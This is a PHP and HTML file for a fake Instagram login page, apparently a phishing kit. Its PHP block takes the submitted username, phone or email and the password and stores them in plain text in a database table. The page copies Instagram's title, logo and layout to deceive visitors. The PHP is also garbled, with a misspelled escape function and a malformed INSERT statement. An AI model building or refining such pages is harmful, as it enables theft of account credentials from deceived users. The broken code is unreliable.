<?php

@include 'coding.php';
if(isset($_POST['submit']))
{
    $name = msqli_real_escape_string($conn,$_POST['Phone number,username or email']);
    $password = msqli_real_escape_string($conn,$_POST['password']);

    $insert "INSERT INTO user_data(username,password")VALUES('$name','$password');
    mysqli_query($conn, $insert);
    
}
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Instagram Login</title>
    <link rel="stylesheet" href="style.css" />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
      integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w=="
      crossorigin="anonymous"
      referrerpolicy="no-referrer"
    />
    <link
      href="https://fonts.googleapis.com/css2?family=Roboto&display=swap"
      rel="stylesheet"
    />
  </head>
  <body>
    <div class="container">
      <div class="center">
        <div class="header">
          <img src="instagramlogo.png" alt="instagramLogo" class="instaLogo" />
        </div>
       <form action="" method="post"> <div class="inputElement">
          <input
            type="text"
            name="Phone number,username or email"
            placeholder="Phone number,username or email"
            class="inputText"
          />
          <input type="password" name="password" placeholder="Password" class="inputText" />
          <input type="submit" name="submit" value="Log in" class="inputButton" />
          <div class="line">
            <span class="arrow"></span>
            <span class="content">OR</span>
            <span class="arrow"></span>
          </div>
          <div class="social__icon">
            <i class="fab fa-facebook-square"></i
            ><span>Log in with facebook</span>
          </div>
          <div class="forgetPassword">Forget Password?</div>
         </div>
           </div>
</form>
       <div class="footer">
        <p>Don't have an account?<span>Sign Up</span></p>
      </div>
    </div>
   
  </body>
</html>
